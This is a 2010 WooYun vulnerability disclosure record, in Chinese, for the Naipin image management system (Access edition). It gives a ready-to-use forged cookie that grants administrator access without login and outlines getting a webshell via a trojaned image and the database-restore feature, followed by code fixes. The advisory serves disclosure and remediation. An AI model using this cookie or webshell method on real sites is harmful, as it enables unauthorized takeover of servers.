{"id": 24014, "wybug_id": "wooyun-2010-0695", "wybug_title": " 耐品图片管理系统Access版有Cookie欺骗漏洞", "wybug_corp": "深圳耐品科技", "wybug_author": "路人甲", "wybug_date": "2010-10-14 18:57", "wybug_open_date": "2010-10-15 10:55", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["耐品图片管理系统", "欺骗"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-10-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-10-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 耐品图片管理系统Access版有Cookie欺骗漏洞，可不登录拿到后台管理权限，进一步提权得webshell 详细说明：  大概一年前我发现了《耐品图片管理系统Access版》有Cookie欺骗漏洞：任意用户可以通过修改Cookie拿到管理员权限。今年6月份我给耐品技术发了邮件，告知了这个漏洞，他们回复如下：”您好，谢谢您的提醒！祝您合家幸福安康！“今天我下载了最新版（Naipin_T_20100906_acc.rar）进行了测试，发现这个漏洞仍然存在。既然官方如此不重视，我就它放出来。\n\n演示视频下载地址：http://www.redicecn.com/attachments2008@see/month_201010/naipin_bug.7zNetpic=ArticleFlag=0&UserName=redice&GroupID=1&Comment=1&Source=0&Article=1&PicFlag=0&Group=%C6%D5%CD%A8%BB%E1%D4%B1&Vote=1&UserId=77&Self=1&View=1&Manage=0&Upload=1&ViewHide=0&Setting=1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1; ASPSESSIONIDCABRBATD=MDCHGDDALJGALHFHOIFLFJLL利用上面的cookie不登录也能拿到管理员权限...拿Webshell的一种思路：如果数据库后缀名是asp的，可以采用该思路。上传用户图像，上传一张含有一句话木马的图片（采用edjpgcom工具）。进入后台，使用数据库恢复功能将上传的图片恢复为数据库。看演示。over 谢谢    漏洞证明：  Netpic=ArticleFlag=0&UserName=redice&GroupID=1&Comment=1&Source=0&Article=1&PicFlag=0&Group=%C6%D5%CD%A8%BB%E1%D4%B1&Vote=1&UserId=77&Self=1&View=1&Manage=0&Upload=1&ViewHide=0&Setting=1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1; ASPSESSIONIDCABRBATD=MDCHGDDALJGALHFHOIFLFJLL利用上面的cookie不登录也能拿到管理员权限...   修复方案：  临时修补办法如下：（1）Admin_ChkLogin.asp第66行下增加如下代码：session(\"GroupId\")=Rs(\"GroupId\")（2）将clsMain.asp的第112行改为如下代码：UserGroupId=session(\"GroupID\")（3）建议尽量做到：能写入的目录不给执行权限，能执行的目录不给写入权限。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}